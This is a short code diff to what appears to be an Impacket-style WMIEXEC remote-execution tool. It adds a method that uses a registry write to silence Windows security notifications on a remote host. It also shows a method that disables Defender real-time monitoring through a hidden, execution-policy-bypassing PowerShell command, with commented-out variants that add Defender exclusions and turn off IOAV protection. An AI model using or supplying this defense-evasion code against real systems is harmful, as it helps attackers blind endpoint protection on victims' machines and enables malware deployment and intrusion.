@@ -159,9 +159,20 @@ class WMIEXEC:
 
         self.__smbconnection.deleteFile(self.__share, self.__output)
 
+    def disable_notifications(self):
+        command = self.__shell + 'reg add "HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /d "0" /t REG_DWORD'
+
+        logging.debug('notifications being disabling using: ' + command)
+        self.__win32Process.Create(command, self.__pwd, None)
+        time.sleep(1)
+
     def disable_defender(self):
         command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Set-MpPreference -DisableRealtimeMonitoring $true;"'
-
+        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionExtension ".exe""'
+        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionProcess $pid"'
+        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionPath $env:temp"'
+        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionExtension ".ps1""'
+        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Set-MpPreference -DisableIOAVProtection 1"'
         logging.debug('wmi Disabling Defender using: ' + command)
         self.__win32Process.Create(command, self.__pwd, None)
         print('            [!] Sleeping to allow defender process to finish shutting down[!] ')
